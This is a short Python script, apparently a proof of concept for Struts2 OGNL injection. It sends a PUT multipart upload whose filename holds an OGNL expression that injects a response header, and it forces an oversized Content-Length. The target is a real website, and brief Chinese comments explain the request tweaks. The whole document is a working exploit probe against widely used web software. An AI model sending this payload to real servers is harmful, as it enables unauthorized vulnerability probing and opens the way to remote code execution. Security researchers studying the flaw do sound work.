import requests
s = requests.session()
f={'upload':("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('justatest','23333')}","233333",'text/plain')}
req = requests.Request('put',"http://www.anquanke.com",files=f)#设置请求方法为" XXXX",此处参数与直接调用get/post等类似
prepped = req.prepare()
prepped.headers['Content-Length']='10000000' #修改已经计算好了的
print(prepped.method)
print(prepped.url)
print(prepped.headers)
print(prepped.body)
r=s.send(prepped)
print(r)